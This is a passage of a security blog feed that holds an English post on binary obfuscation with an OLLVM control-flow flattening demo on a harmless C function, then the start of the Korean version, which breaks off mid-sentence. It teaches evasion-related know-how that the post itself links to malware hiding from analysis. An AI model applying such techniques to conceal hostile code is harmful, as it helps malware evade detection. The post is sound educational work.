<span class="hljs-number">2</span>;    } <span class="hljs-keyword">else</span> {        <span class="hljs-keyword">return</span> x - <span class="hljs-number">2</span>;    }}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">int</span> value = <span class="hljs-number">5</span>;    <span class="hljs-keyword">int</span> result = secret_function(value);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result: %d\n&quot;</span>, result);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>First, compile it normally and then compile it with obfuscation enabled:</p><pre><code class="hljs bash">$ clang flatten_example.c -o flatten_example_norm$ path_to_the/build/bin/clang -mllvm -fla flatten_example.c -o flatten_example_obf</code></pre><p>Now, let&#x2019;s analyze both binaries using IDA.</p><p>On the left is <code>flatten_example_norm</code>, and on the right is <code>flatten_example_obf</code> .</p><p>Here&#x2019;s the disassembled <code>secret_function</code>:</p><p><img src="image%2010.png" alt="image.png"></p><p>And the control flow graph (CFG) of <code>secret_function</code>:</p><p><img src="image%2011.png" alt="image.png"></p><p>You can already see a stark difference &#x2014; even though the original code was simple!</p><p>Of course, despite all the added complexity, the execution result remains exactly the same:</p><p><img src="image%2012.png" alt="image.png"></p><h2 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="4. Conclusion"></a>4. Conclusion</h2><h3 id="Limitations"><a href="#Limitations" class="headerlink" title="Limitations"></a>Limitations</h3><p>Of course, obfuscation also comes with clear limitations.</p><ul><li><strong>Performance Degradation:</strong> The insertion of unnecessary logic and complex branching during obfuscation can significantly reduce program performance.</li><li><strong>Counterattack by Evolving Tools:</strong> Static analyzers, deobfuscators, and other analysis tools continue to advance, allowing certain obfuscation techniques to be bypassed relatively easily.</li><li><strong>Legal and Ethical Issues:</strong> Applying excessive obfuscation to commercial software can undermine user trust, and in some cases, lead to legal disputes.</li></ul><h3 id="Significance"><a href="#Significance" class="headerlink" title="Significance"></a>Significance</h3><p>As we have seen so far, obfuscation techniques can be broadly categorized into <strong>Structural</strong>, <strong>Data</strong>, and <strong>Algorithmic</strong> aspects based on their working mechanisms. However, in real-world software analysis, these categories are not isolated. In practice, all three aspects are often combined, and furthermore, numerous variants and modifications&#x2014;along with entirely new ideas&#x2014;continue to emerge, making analysis even more complex.</p><p>For example, let&#x2019;s briefly look at the obfuscation techniques used by DJI, a commercial drone company well-known for its heavy obfuscation.</p><ul><li><strong>Structural Obfuscation:</strong> Splitting eight DEX files into 128KB chunks and encrypting each chunk with <strong>AES-256</strong>.</li><li><strong>Data Obfuscation:</strong> Generating an <strong>XOR-based key</strong> by combining the string <code>com.dji.industry.pilot</code> with hardcoded constants.</li><li><strong>Algorithmic Obfuscation:</strong> Redirecting JNI calls through a <strong>three-stage trampoline function</strong> before reaching the actual native function.</li></ul><p>Modern obfuscation technologies no longer rely on single-layer techniques. Instead, they adopt <strong>multi-layered, modular defense systems</strong>, incorporating new variants every year to complicate analysis even further. Some experimental approaches are also emerging, such as using AI-generated fake code patterns or leveraging quantum cryptography for key exchanges&#x2014;highlighting how obfuscation evolves alongside technological advancement.</p><p>As we&#x2019;ve repeatedly discussed in Parts 1, 2, and 3:</p><blockquote><p>&#x201C;Every protection layer is merely a device to buy time &#x2014; it can never guarantee absolute safety.&#x201D;</p><p>&#x2013; Quarkslab Research Team</p></blockquote><p>Obfuscation and anti-debugging techniques are ultimately part of the <strong>ongoing battle to protect code</strong>. In the endless tug-of-war between reverse engineers and developers, technology continues to evolve&#x2014;and through that struggle, the entire field of security moves forward. Obfuscation today is not only crucial for legitimate software protection but also actively used in <strong>malware</strong> to evade detection and delay analysis. It has become a <strong>fundamental technique on both sides</strong> of the attack and defense landscape.</p><p>Obfuscation is a means to <strong>delay attacks and buy time for defense</strong>, but no shield is ever perfect. Analysts will persistently trace the flow and improve their tools, while developers will devise new obfuscation techniques to reinforce their defenses.</p><p><strong>This battle will never end.</strong></p><p>Because as technology evolves, so too will the methods of attack and defense. Rather than seeing obfuscation as merely an obstacle, we should recognize it as <strong>an essential part of the evolutionary process toward a more secure environment</strong>. Even amid the endless clash of spear and shield, our goal remains the same.</p><p><img src="image%2013.png" alt="image.png"></p><blockquote><p>&#x201C;The game goes on. And for our own reasons, we each dive into this never-ending game.&#x201D;</p></blockquote><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>&#xB9AC;&#xBC84;&#xC2F1; &#xD575;&#xC2EC; &#xC6D0;&#xB9AC;: &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xC758; &#xB9AC;&#xBC84;&#xC2F1; &#xC774;&#xC57C;&#xAE30;(&#xC800;&#xC790; &#xC774;&#xC2B9;&#xC6D0;)</p><p><a href="https://m.blog.naver.com/choijo2/60196192627">https://m.blog.naver.com/choijo2/60196192627</a></p><p><a href="http://en.wikipedia.org/wiki/Obfuscation_(software">http://en.wikipedia.org/wiki/Obfuscation_(software)</a>)</p><p><a href="https://blog.quarkslab.com/dji-the-art-of-obfuscation.html">https://blog.quarkslab.com/dji-the-art-of-obfuscation.html</a></p><p><a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/">https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/</a></p><p><a href="https://github.com/obfuscator-llvm/obfuscator">https://github.com/obfuscator-llvm/obfuscator</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anti-Debugging/">Anti-Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Reverse-Engineering/">Reverse Engineering</category>
      
      <category domain="https://hackyboiz.github.io/tags/OLLVM/">OLLVM</category>
      
      <category domain="https://hackyboiz.github.io/tags/Obfuscation/">Obfuscation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Anti-Debugging Part 3(KR)</title>
      <link>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/kr/</link>
      <guid>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/kr/</guid>
      <pubDate>Mon, 28 Apr 2025 13:15:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; OUYA77 &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#x1F642;&lt;/p&gt;
&lt;p&gt;&amp;#xB098;&amp;#xC911;&amp;#xC5D0; &amp;#xAE30;&amp;#xD68C;&amp;#xAC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; OUYA77 &#xC785;&#xB2C8;&#xB2E4;. &#x1F642;</p><p>&#xB098;&#xC911;&#xC5D0; &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xBE14;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; &#xB09C;&#xB3C5;&#xD654;&#xB3C4; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xB2E4; &#xD588;&#xB294;&#xB370; &#xB9C8;&#xCE68; &#xAE30;&#xD68C;&#xAC00; &#xB418;&#xC5B4;&#xC11C;(?) &#xC774;&#xB807;&#xAC8C; Part 3&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Part 1&#xC5D0;&#xC11C;&#xB294; &#xB514;&#xBC84;&#xAE45;&#xACFC; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xACE0; Part 2&#xC5D0;&#xC11C;&#xB294; &#x201C;&#xD568;&#xC815;&#xCE74;&#xB4DC;&#x201D;&#xCC98;&#xB7FC; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC774; &#xD2B9;&#xC815; &#xB3D9;&#xC791;&#xC744; &#xB9C9;&#xC73C;&#xB824; &#xD560; &#xB54C; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC778; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45; &#xC6B0;&#xD68C;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>(&#xD639;&#xC2DC; &#xC544;&#xC9C1; &#xBABB;&#xBCF4;&#xC168;&#xB2E4;&#xBA74; &#x1F447; &#x314E;&#x314E;).</p><blockquote><p><em>&#xC9C0;&#xB09C; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</em><br><a href="https://hackyboiz.github.io/2024/12/29/OUYA77/Anti_part1/kr/">[Research] Anti-Debugging Part1(KR)</a><br><a href="https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/kr/">[Research] Anti-Debugging Part2(KR)</a></p></blockquote><p>&#xAE34; &#xD638;&#xD761;&#xC73C;&#xB85C; &#xC774;&#xC57C;&#xAE30;&#xAC00; &#xC804;&#xAC1C;&#xB41C; &#xB9CC;&#xD07C; &#xAE4C;&#xBA39;&#xC73C;&#xC168;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC744;&#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xB294;&#xB370;&#xC694;. &#xD639;&#xC2DC; &#xADF8;&#xB7EC;&#xC168;&#xC744;&#xAE4C;&#xBD10; &#xC81C;&#xAC00; &#xAC04;&#xB2E8;&#xD55C; &#xCE74;&#xD230;(?)&#xC744; &#xC900;&#xBE44;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. <del>&#xB9CC;&#xB4DC;&#xB294;&#xB370; &#xC0AC;&#xC2EC;&#xC740; &#xC808;&#xB300; &#xC11E;&#xC9C0; &#xC54A;&#xC558;&#xC5B4;&#xC694;. &#xB9CC;&#xB4E4;&#xB2E4;&#xAC00; &#xD504;&#xB808;&#xC784;&#xC744; &#xC9DC;&#xB294;&#xAC8C; &#xC5B4;&#xB824;&#xC6CC;&#xC11C; &#xC804;&#xBB38;&#xAC00;&#xB2D8;&#xC758; &#xB3C4;&#xC6C0;&#xC744; &#xBC1B;&#xC740; &#xAC83;&#xB3C4; &#xBE44;&#xBC00;&#xC774;&#xB78D;&#xB2C8;&#xB2E4;.</del></p><h2 id="Anti-Dubbugging-Part-&#xC694;&#xC57D;"><a href="#Anti-Dubbugging-Part-&#xC694;&#xC57D;" class="headerlink" title="Anti-Dubbugging Part &#xC694;&#xC57D;"></a>Anti-Dubbugging Part &#xC694;&#xC57D;</h2><p><img src="image%201.png" alt="image.png"></p><p><img src="image%202.png" alt="image.png"></p><p><img src="image%203.png" alt="image.png"></p><p>&#xC704; &#xCE74;&#xD230;&#xC5D0;&#xC11C;&#xB3C4; &#xBCF4;&#xC168;&#xB2E4;&#xC2DC;&#xD53C; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC774; &#xB098;&#xC654;&#xACE0; &#xADF8;&#xAC78; &#xB610; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; Part 1, 2&#xC5D0; &#xAC78;&#xCCD0;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC758; &#xD55C;&#xACC4;&#xB294; <strong>&#xACB0;&#xAD6D; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC62C;&#xB77C;&#xAC00;&#xC57C; &#xD558;&#xB2E4; &#xBCF4;&#xB2C8;</strong>, &#xADF8;&#xB9AC;&#xACE0; <strong>&#xBD84;&#xC11D;&#xC758; &#xB300;&#xC0C1;&#xC774; &#xB418;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC790;&#xCCB4;&#xAC00; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC8FC;&#xC5B4;&#xC9C0;&#xB2E4; &#xBCF4;&#xB2C8;</strong>, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC758; &#xB85C;&#xC9C1;&#xC744; &#xD30C;&#xC545;&#xD574;&#xC11C; &#xD328;&#xCE58;&#xD558;&#xB294; &#xB4F1;&#xC73C;&#xB85C; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xACE0;&#xB4E0; &#xB7A8;&#xC9C0; &#xC120;&#xC0DD;&#xB2D8;&#xC774; &#x201C;&#xC774; &#xC7AC;&#xB8CC;(&#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45; &#xB85C;&#xC9C1;)&#xAC00; &#xBB54;&#xC9C0; &#xBAA8;&#xB974;&#xAC8C; &#xC228;&#xACA8;&#xC57C; &#xD574;!&#x201D; &#xB77C;&#xACE0; &#xBD88;&#xC465; &#xB098;&#xD0C0;&#xB098;&#xC154;&#xC11C; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xB77C;&#xACE0; &#xD558;&#xC2E0; &#xAC70;&#xC8E0;! &#x1F525;&#x1F468;&#x200D;&#x1F373;</p><blockquote><p>In Part 2&#x2026;</p><p><img src="image%204.png" alt="image.png"></p><blockquote><p>???: &#xADF8;&#xB7FC; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB974;&#xAC8C; &#xD558;&#xBA74; &#xB418;&#xC9C0; &#xC54A;&#xB0D0;! / 000: &#xC5B4;&#xB5BB;&#xAC8C;!!</p></blockquote></blockquote><p>&#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45;&#xC774; &#xAC78;&#xB9B0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC5B4;&#xB5A4; &#xBD80;&#xBD84;&#xC774; &#xC548;&#xD2F0;&#xB514;&#xBC84;&#xAE45; &#xB85C;&#xC9C1;&#xC778;&#xC9C0; &#xC54C; &#xC218; &#xC5C6;&#xACE0; &#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xAE30;&#xAC00; &#xB354;&#xC6B1; &#xAE4C;&#xB2E4;&#xB86D;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xBC88; Part 3&#xC5D0;&#xC11C;&#xB294; &#xC774; <strong>&#xB09C;&#xB3C5;&#xD654;</strong>&#xB77C;&#xB294; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xB140;&#xC11D;&#xC744; &#xC9D1;&#xC911;&#xC801;&#xC73C;&#xB85C; &#xD30C;&#xD5E4;&#xCCD0; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="1-&#xB09C;&#xB3C5;&#xD654;-Obfuscation"><a href="#1-&#xB09C;&#xB3C5;&#xD654;-Obfuscation" class="headerlink" title="1. &#xB09C;&#xB3C5;&#xD654;(Obfuscation)"></a>1. &#xB09C;&#xB3C5;&#xD654;(Obfuscation)</h2><h3 id="1-1-&#xC18C;&#xAC1C;"><a href="#1-1-&#xC18C;&#xAC1C;" class="headerlink" title="1.1 &#xC18C;&#xAC1C;"></a>1.1 &#xC18C;&#xAC1C;</h3><ul><li><strong>&#xB09C;&#xB3C5;&#xD654;(Obfuscation)</strong>&#xB780; &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xAE30;&#xC220;&#xC785;&#xB2C8;&#xB2E4;. Wikipedia&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;:</li></ul><blockquote><p>&#x201C;&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xB09C;&#xB3C5;&#xD654;&#xB780;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC758; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xB610;&#xB294; &#xBA38;&#xC2E0;&#xCF54;&#xB4DC;&#xB97C; &#xB09C;&#xB3C5;&#xD654;&#xD558;&#xC5EC; &#xC0AC;&#xB78C; &#xB610;&#xB294; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xAC00; &#xC774;&#xD574;&#xD558;&#xAC70;&#xB098; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xC77C;&#xC774;&#xB2E4;.&#x201D;</p></blockquote><p>&#xC774;&#xB294; &#xB2E8;&#xC21C;&#xD55C; &#xCF54;&#xB4DC; &#xAC00;&#xB3C5;&#xC131; &#xC800;&#xD558;&#xB97C; &#xB118;&#xC5B4;&#xC11C;, <strong>&#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;, &#xB514;&#xBC84;&#xAE45;, &#xC815;&#xC801; &#xBD84;&#xC11D; &#xB4F1;&#xC744; &#xBC29;&#xD574;</strong>&#xD558;&#xACE0;, &#xC9C0;&#xC801; &#xC7AC;&#xC0B0; &#xBCF4;&#xD638;, &#xBCF4;&#xC548; &#xAC15;&#xD654;, &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D; &#xD68C;&#xD53C; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xBAA9;&#xC801;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="1-2-&#xBAA9;&#xC801;"><a href="#1-2-&#xBAA9;&#xC801;" class="headerlink" title="1.2 &#xBAA9;&#xC801;"></a>1.2 &#xBAA9;&#xC801;</h3><p>&#xB09C;&#xB3C5;&#xD654;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB3D9;&#xC791;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;&#xC11C;&#xB3C4;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBD84;&#xC11D; &#xBC29;&#xC9C0; &#xBAA9;&#xC801;&#xC744; &#xB2EC;&#xC131;&#xD569;&#xB2C8;&#xB2E4;:</p><ul><li><strong>&#xAC00;&#xB3C5;&#xC131; &#xC800;&#xD558;:</strong> &#xCF54;&#xB4DC;&#xC758; &#xB17C;&#xB9AC; &#xAD6C;&#xC870;&#xC640; &#xC758;&#xBBF8;&#xB97C; &#xC228;&#xACA8; &#xBD84;&#xC11D;&#xC790;&#xC758; &#xC774;&#xD574;&#xB97C; &#xBC29;&#xD574;</li><li><strong>&#xAD6C;&#xC870;&#xC801; &#xBCF5;&#xC7A1;&#xC131; &#xC99D;&#xAC00;:</strong> &#xBD88;&#xD544;&#xC694;&#xD55C; &#xC5F0;&#xC0B0;, &#xBE44;&#xC120;&#xD615;&#xC801; &#xD750;&#xB984;, &#xB09C;&#xC218; &#xAE30;&#xBC18; &#xC870;&#xAC74; &#xB4F1; &#xC0BD;&#xC785;</li><li><strong>&#xD328;&#xD134; &#xD0D0;&#xC9C0; &#xD68C;&#xD53C;:</strong> &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xAE30;&#xBC18; &#xD0D0;&#xC9C0; &#xB3C4;&#xAD6C;&#xC758; &#xC624;&#xD0D0; &#xB610;&#xB294; &#xD0D0;&#xC9C0; &#xD68C;&#xD53C; &#xC720;&#xB3C4;</li></ul><p>&#xADF8;&#xB798;&#xC11C; &#xBD84;&#xC11D;&#xAC00;&#xAC00; &#x201C;&#xC544;~ &#xACE4;&#xB780;&#xD558;&#xB124; ;;&#x201D; &#xC774;&#xB807;&#xAC8C; &#xC0DD;&#xAC01;&#xC774; &#xB4E4;&#xC5C8;&#xB2E4;&#xBA74; &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xBAA9;&#xC801;&#xC744; &#xC5B4;&#xB290;&#xC815;&#xB3C4; &#xC774;&#xB918;&#xB2E4;&#xACE0; &#xBD10;&#xB3C4; &#xBB34;&#xBC29;&#xD569;&#xB2C8;&#xB2E4;. </p><h3 id="1-3-&#xB09C;&#xB3C5;&#xD654;&#xC758;-&#xBD84;&#xB958;"><a href="#1-3-&#xB09C;&#xB3C5;&#xD654;&#xC758;-&#xBD84;&#xB958;" class="headerlink" title="1.3 &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xBD84;&#xB958;"></a>1.3 &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xBD84;&#xB958;</h3><p>&#xB09C;&#xB3C5;&#xD654;&#xB294; &#xD06C;&#xAC8C; &#xB450; &#xAC00;&#xC9C0; &#xBC94;&#xC8FC;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><strong>&#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xB09C;&#xB3C5;&#xD654; (Source Code Obfuscation)</strong></li></ol><ul><li><strong>&#xC801;&#xC6A9; &#xB300;&#xC0C1;</strong>: &#xC0AC;&#xB78C;&#xC774; &#xC791;&#xC131;&#xD55C; &#xACE0;&#xC218;&#xC900; &#xC5B8;&#xC5B4; (Java, JavaScript, Python &#xB4F1;)</li><li><strong>&#xC801;&#xC6A9; &#xC2DC;&#xC810;</strong>: &#xCEF4;&#xD30C;&#xC77C; &#xC774;&#xC804;</li><li><strong>&#xBAA9;&#xC801;</strong>: &#xB0B4;&#xBD80; &#xBCF4;&#xC548; &#xD655;&#xBCF4;, &#xC678;&#xC8FC;/&#xACE0;&#xAC1D;&#xC6A9; &#xCF54;&#xB4DC; &#xC77C;&#xBD80; &#xACF5;&#xAC1C; &#xC2DC; &#xD50C;&#xB85C;&#xC6B0; &#xBCF4;&#xD638;</li></ul><p>&#xC18C;&#xC2A4;&#xCF54;&#xB4DC; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xC885;&#xC885; &#xB0B4;&#xBD80; &#xB610;&#xB294; &#xACE0;&#xAC1D;&#xC5D0;&#xAC8C; &#xC18C;&#xC2A4; &#xC77C;&#xBD80;&#xB97C; &#xACF5;&#xAC1C;&#xD574;&#xC57C; &#xD560; &#xACBD;&#xC6B0;, &#xC804;&#xCCB4; &#xB85C;&#xC9C1;&#xC774;&#xB098; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC720;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xB294; &#xC0AC;&#xB78C;&#xC740; &#xC77C;&#xBD80; &#xC218;&#xC815;&#xC740; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC;, &#xC804;&#xCCB4; &#xAD6C;&#xC870;&#xB098; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC; &#xAE30;&#xBC95;&#xC73C;&#xB85C;&#xB294; &#x201C;&#xC2DD;&#xBCC4;&#xC790; &#xC774;&#xB984; &#xBCC0;&#xACBD;&#x201D;, &#x201C;&#xCF54;&#xB4DC; &#xBE14;&#xB85D; &#xC7AC;&#xBC30;&#xC5F4;&#x201D;, &#x201C;&#xC81C;&#xC5B4; &#xD750;&#xB984; &#xB09C;&#xB3C5;&#xD654;&#x201D;, &#x201C;&#xBB38;&#xC790;&#xC5F4; &#xC778;&#xCF54;&#xB529;&#x201D;&#xC744; &#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654; (Binary Obfuscation)</strong></li></ol><ul><li><strong>&#xC801;&#xC6A9; &#xB300;&#xC0C1;</strong>: &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xC2E4;&#xD589;&#xD30C;&#xC77C; (C, C++, Go &#xB4F1;)</li><li><strong>&#xC801;&#xC6A9; &#xC2DC;&#xC810;</strong>: &#xCEF4;&#xD30C;&#xC77C; &#xC2DC; &#xD639;&#xC740; &#xC774;&#xD6C4; &#xBCC0;&#xD615;</li><li><strong>&#xBAA9;&#xC801;</strong>: &#xC81C;&#xD488; &#xBCF4;&#xD638;, &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xC720;&#xCD9C; &#xBC29;&#xC9C0;, &#xD06C;&#xB799;/&#xB9AC;&#xBC84;&#xC2F1; &#xBC29;&#xC9C0;</li></ul><p>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xB294; <strong>&#xC2E4;&#xC81C; &#xBC30;&#xD3EC;&#xB418;&#xB294; &#xC81C;&#xD488; &#xBCF4;&#xD638;&#xC758; &#xD575;&#xC2EC;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xC0C1;&#xC6A9; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; &#xB300;&#xBD80;&#xBD84; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD615;&#xD0DC;&#xB85C; &#xBC30;&#xD3EC;&#xB418;&#xBA70;, &#xC774; &#xC548;&#xC5D0;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;, &#xB77C;&#xC774;&#xC120;&#xC2A4; &#xB85C;&#xC9C1;, &#xC778;&#xC99D; &#xCCB4;&#xACC4; &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;, &#xACF5;&#xACA9;&#xC790;&#xB098; &#xACE0;&#xAC1D;&#xC774; &#xC774;&#xB97C; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xC744; &#xD558;&#xAC70;&#xB098; &#xD06C;&#xB799;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC5EC;&#xAE30;&#xC11C;&#xB294; &#x201C;&#xC81C;&#xD488; &#xBCF4;&#xD638;&#x201D;&#xB77C;&#xACE0; &#xD588;&#xB294;&#xB370; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB3C4; &#xC81C;&#xD488;&#xC774;&#xB77C;&#xBA74; &#xC81C;&#xD488;&#xC774;&#xAE34; &#xD558;&#xC8E0;.. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC5D0;&#xB3C4; &#xC774; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;(IDA, Ghidra &#xB4F1;)&#xC758; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xBC29;&#xD574;&#xD558;&#xACE0; &#xB514;&#xBC84;&#xAE45; &#xD750;&#xB984;&#xC744; &#xAD50;&#xB780;&#xD558;&#xBA70;, &#xC2EC;&#xC9C0;&#xC5B4;&#xB294; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC5D0;&#xB9CC; &#xCF54;&#xB4DC;&#xAC00; &#xD574;&#xB3C5;&#xB418;&#xB294; &#xD615;&#xD0DC;&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC; &#xAE30;&#xBC95;&#xC73C;&#xB85C;&#xB294; &#x201C;&#xC81C;&#xC5B4; &#xD750;&#xB984; &#xBCC0;&#xD615;&#x201D;, &#x201C;&#xBB38;&#xC790;&#xC5F4; &#xC554;&#xD638;&#xD654;&#x201D;, &#x201C;&#xAC00;&#xC9DC; &#xCF54;&#xB4DC; 